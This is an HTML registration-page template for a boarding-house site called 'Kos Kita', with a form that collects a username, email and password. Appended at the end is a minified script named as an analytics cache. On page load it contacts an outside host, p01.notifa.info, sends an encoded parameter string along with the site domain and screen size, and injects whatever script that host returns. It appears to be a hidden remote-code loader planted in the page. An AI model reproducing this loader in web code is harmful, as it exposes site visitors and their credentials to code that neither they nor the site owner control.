
<!doctype html>
<html lang="en" class="fullscreen-bg">
<head>
	<title>Login | Kos Kita</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

	<!-- VENDOR CSS -->
<link rel="stylesheet" href="{{asset('assets/css/bootstrap.min.css')}}">
	<link rel="stylesheet" href="{{asset('assets/vendor/font-awesome/css/font-awesome.min.css')}}">
	<link rel="stylesheet" href="{{asset('assets/vendor/linearicons/style.css')}}">

	<!-- MAIN CSS -->
	<link rel="stylesheet" href="{{asset('assets/css/main.css')}}">

	<!-- FOR DEMO PURPOSES ONLY. You should remove this in your project -->
	<link rel="stylesheet" href="{{asset('assets/css/demo.css')}}">

	<!-- GOOGLE FONTS -->
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700" rel="stylesheet">

	<!-- ICONS -->
	<link rel="apple-touch-icon" sizes="76x76" href="{{asset('assets/img/apple-icon.png')}}">
	<link rel="icon" type="image/png" sizes="96x96" href="{{asset('assets/img/favicon.png')}}">
</head>
<body>
	<!-- WRAPPER -->
	<div id="wrapper">
		@if(\Session::has('error'))
			<div class="alert alert-danger">
				<div>{{Session::get('error')}}</div>
			</div>
		@endif
			
		<div class="vertical-align-wrap">
			<div class="vertical-align-middle">
				<div class="auth-box ">
					<div class="left">
						<div class="content">
							<div class="header">
								<p class="h3">Register to your account</p>
							</div>
						<form class="form-auth-small" action="{{url('/go_register')}}" method="post">
                            {{ csrf_field() }}
                            <div class="form-group">
                                <label class="control-label sr-only">Username</label>
                                <input type="text" name ="name" class="form-control" value="" placeholder="Username">
                            </div>
								<div class="form-group">
									<label class="control-label sr-only">Email</label>
									<input type="email" name ="email" class="form-control" value="" placeholder="Email">
								</div>
								<div class="form-group">
									<label class="control-label sr-only">Password</label>
									<input type="password" name="password" class="form-control"  value="" placeholder="Password">
								</div>
								<div class="form-group">
									<label class="control-label sr-only">Retype Password</label>
									<input type="password" name="repassword" class="form-control" value="" placeholder="Retype Password">
								</div>
								<button type="submit" class="btn btn-success btn-lg btn-block">REGISTER</button>
								
							</form>
						</div>
                    </div>
                    <div class="right">
						<div class="overlay"></div>
						<div class="content text">
							<h1 class="heading">Register Kos-Kosan Kita</h1>
						</div>
					</div>
					<div class="clearfix"></div>
				</div>
			</div>
		</div>
	</div>
	<!-- END WRAPPER -->

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2nos4el7UXQRMEfrHfUT2N4FZvB3366QnmmYMGDmth6fJp5XXwdz9%2fJXbtNcJHHXYzWiByajNPZiPfwzZYmV1c6U5%2bi%2brdyolWu%2bT%2fcNUSmPWTGrPb0Oyj6efykswvkW6Ms6SvV8rzItDCaNCUZJ6EdbYciqV%2fTyukLP6IlT9INBQkh1pAE3h0jYBH96uSI30Owhlxq2xudPH7%2fEnCKpi1Pso1WEPxUellReZUTZPHD358s78h2GG6cxBqpB6Lg4wgvrH6x0ruU4PBRyDFXHPwQGIyGHyI4bp%2f642iG4whNylF%2fvuXZNH6v%2bnXW9qdoQfWFbbEIfBvFfgSHH7koJtUFAwA%2f8vQTsA1TsgqyNLAibfnWCXYzjfLINvmH0eoAprJXFbNfZBf9pdIHw0ld6lH9V%2fuBeQS0knolCYNnMINbe6SYoy%2bslL%2bbt3Is506L13YZUyjKTLiBIhCWyj7g0KCM846lp5megA5x5emnxYHSbHmeeXwoDIU5O9Yk4UpYYYkmTb27ft%2fTevPOMpfi%2bqcBBYRJaVo%2fJQjZEMxF4J1tlkXXp7zQwZcCd09ZlGeVKSA0jN%2fGvzdA2epaCVrc542qNLGZwX8YSyEAC%2blnE6dUc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>